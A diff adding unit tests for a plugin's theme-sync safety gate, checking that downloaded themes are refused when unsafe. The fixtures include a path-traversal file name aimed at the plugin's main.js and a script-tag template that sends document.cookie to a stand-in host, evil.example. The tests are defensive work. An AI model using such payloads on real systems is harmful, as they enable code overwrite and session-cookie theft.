@@ -442,7 +442,82 @@ describe('ThemeSyncService.apply', () => {
   it('does nothing for an empty selection', async () => {
     const harness = makeService({});
     const result = await harness.service.apply([]);
-    expect(result).toEqual({ created: 0, overwritten: 0, failed: [], mismatched: [] });
+    expect(result).toEqual({ created: 0, overwritten: 0, failed: [], mismatched: [], rejected: [] });
     expect(harness.persisted()).toBe(0);
+  });
+
+  // The safety gate (`theme-safety.ts`, `isSafeThemeFileName`). These describe
+  // the one path where a network response would otherwise reach the disk
+  // unchecked, so each refusal pins both halves: nothing written, and nothing
+  // recorded — a refused theme must not come back looking "up to date".
+
+  it('refuses a file name that would escape the themes folder', async () => {
+    const content = 'anything';
+    const escaped = '../../.obsidian/plugins/wewrite/main.js';
+    const harness = makeService({ files: { [escaped]: content } });
+    const change = classifyThemeChange(entry({ file: escaped, hash: themeContentHash(content) }), {
+      installed: false,
+    });
+
+    const result = await harness.service.apply([change]);
+
+    expect(result.rejected).toEqual([{ file: escaped, reason: 'unsafe-name', rules: [] }]);
+    expect(harness.written.size).toBe(0);
+    expect(harness.states[escaped]).toBeUndefined();
+    expect(harness.persisted()).toBe(0);
+  });
+
+  it('refuses a theme whose custom values carry active content', async () => {
+    const content = [
+      '---',
+      'wewrite_theme: true',
+      "wewrite_theme_version: '3.0'",
+      'wewrite_theme_name: 恶意主题',
+      'custom_values:',
+      '  heading.decoration:',
+      '    - id: custom_x',
+      '      name: 自定义',
+      '      template: "<script>fetch(\'https://evil.example/\'+document.cookie)</script>"',
+      '---',
+      '# 一级标题',
+      '',
+    ].join('\n');
+
+    const harness = makeService({ files: { '001-晨曦蓝调.md': content } });
+    const change = classifyThemeChange(entry({ hash: themeContentHash(content) }), { installed: false });
+
+    const result = await harness.service.apply([change]);
+
+    expect(result.rejected).toHaveLength(1);
+    expect(result.rejected[0].reason).toBe('unsafe-content');
+    expect(result.rejected[0].rules).toContain('script-tag');
+    expect(harness.written.size).toBe(0);
+    expect(result.created).toBe(0);
+    expect(harness.persisted()).toBe(0);
+  });
+
+  it('still writes a theme whose custom values are inert', async () => {
+    const content = [
+      '---',
+      'wewrite_theme: true',
+      "wewrite_theme_version: '3.0'",
+      'wewrite_theme_name: 正常主题',
+      'custom_values:',
+      '  heading.decoration:',
+      '    - id: custom_x',
+      '      name: 自定义',
+      "      template: '<{tag} style=\"border-top:2px solid {{blockColor}}\">{text}</{tag}>'",
+      '---',
+      '# 一级标题',
+      '',
+    ].join('\n');
+
+    const harness = makeService({ files: { '001-晨曦蓝调.md': content } });
+    const result = await harness.service.apply([
+      classifyThemeChange(entry({ hash: themeContentHash(content) }), { installed: false }),
+    ]);
+
+    expect(result.rejected).toEqual([]);
+    expect(result.created).toBe(1);
   });
 });
